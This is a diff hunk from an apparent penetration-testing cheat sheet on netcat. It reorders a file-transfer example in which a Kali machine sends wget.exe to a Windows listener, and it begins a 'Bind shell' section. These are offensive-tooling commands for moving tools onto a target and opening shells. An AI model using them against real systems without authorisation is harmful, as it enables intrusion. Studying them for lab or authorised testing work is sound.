@@ -51,9 +51,9 @@ Kali                    nc -nv 192.168.1.10 4444
 Windows                 nc.exe -nlvp 4444
 
 - Transfer a file
-Kali                    nc -nv 192.168.1.10 4444 < /usr/share/windows-binaries/wget.exe
 Windows                 nc.exe -nlvp 4444 > wget.exe
-There is no output letting you know when the transfer is complete
+Kali                    nc -nv 192.168.1.10 4444 < /usr/share/windows-binaries/wget.exe
+There is no output letting you know when the transfer is complete.
 
 - Bind shell
 Kali                    nc -nv 192.168.1.10 4444
